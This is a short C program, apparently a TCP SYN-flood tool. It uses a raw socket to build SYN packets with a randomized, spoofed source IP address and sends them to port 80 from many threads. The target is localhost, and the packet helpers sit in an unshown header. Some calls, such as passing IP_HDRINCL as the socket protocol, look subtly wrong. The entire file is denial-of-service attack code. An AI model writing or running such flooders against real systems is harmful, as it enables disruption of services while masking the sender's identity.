#include "packets.h"

void *thread_handler(){
    const char *server_ip = "127.0.0.1";
    uint16_t port = 80;

    int sd = socket(AF_INET, SOCK_RAW, IP_HDRINCL);
    if(sd == -1){
        perror("socket error");
        exit(EXIT_FAILURE);
    }

    // packets
    IP_Header_t *iphead = (IP_Header_t *) malloc(sizeof(IP_Header_t));
    TCP_Header_t *tcphead = (TCP_Header_t *) malloc(sizeof(TCP_Header_t));

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if(inet_pton(AF_INET, server_ip, &dest_addr.sin_addr) <= 0){
        perror("inet_pton error");
        exit(EXIT_FAILURE);
    }
    
    size_t syn_len = sizeof(IP_Header_t) + sizeof(TCP_Header_t);

    fill_SYN(iphead, tcphead, dest_addr.sin_addr.s_addr, dest_addr.sin_port);

    srand(time(NULL));
    randomize_src(iphead, rand());

    byte *ip_stream = serialize_ip_header(iphead);
    byte *tcp_stream = serialize_tcp_header(tcphead);

    byte *syn = form_packet(ip_stream, tcp_stream);
    printf("\n");
    bin_dump(syn, syn_len, LITTLE_ENDIAN);
    printf("\n");
    hexDump(syn, syn_len);
    printf("\nPacket length: %lu\n\n", syn_len);
    update_checksums(syn);

    if(sendto(sd, syn, syn_len, 0, (struct sockaddr *) &dest_addr, sizeof(struct sockaddr_in)) < 0){
        perror("sendto error");
        exit(EXIT_FAILURE);
    }else{
        printf("Sent successfully\n");
    }
    close(sd);
    return NULL;
}

int main() {
    pthread_t ptid;
    for(int i = 0; i < IO_LIMIT; i++){
        int pt = pthread_create(&ptid, NULL, thread_handler, NULL);
        if(pt != 0){
            perror("pthread error");
        }
    }
    pthread_exit(NULL);
    return 0;
}
